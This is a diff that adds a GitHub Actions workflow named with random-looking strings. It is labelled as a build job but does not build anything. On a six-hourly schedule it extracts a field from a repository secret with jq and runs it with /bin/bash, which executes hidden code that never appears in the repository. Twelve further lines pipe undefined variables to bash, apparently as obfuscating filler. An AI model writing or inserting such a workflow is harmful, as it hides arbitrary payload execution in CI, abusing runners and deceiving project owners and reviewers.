@@ -1,0 +1,31 @@
+name: madison6415os
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '42 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: madison6415os
+        env:
+          fed2: ${{ secrets.fed2 }}
+        run: |
+          printf '%s' "$fed2" | jq -r .egim78 | /bin/bash
+          echo $lujnq1 | jq -r .lcwy433 | /bin/bash
+          echo $yzjcv9999 | jq -r .si50 | /bin/bash
+          echo $ivx9 | jq -r .jxw47034 | /bin/bash
+          echo $xz597 | jq -r .nzawo5 | /bin/bash
+          echo $um9 | jq -r .xmxxk27788 | /bin/bash
+          echo $ztdk87646 | jq -r .zopra11 | /bin/bash
+          echo $fd8 | jq -r .c1 | /bin/bash
+          echo $qnki2642 | jq -r .tt96 | /bin/bash
+          echo $jdlm4620 | jq -r .y6999 | /bin/bash
+          echo $d9591 | jq -r .fja2291 | /bin/bash
+          echo $z6161 | jq -r .ji5 | /bin/bash
+          echo $g83 | jq -r .eh84 | /bin/bash
+
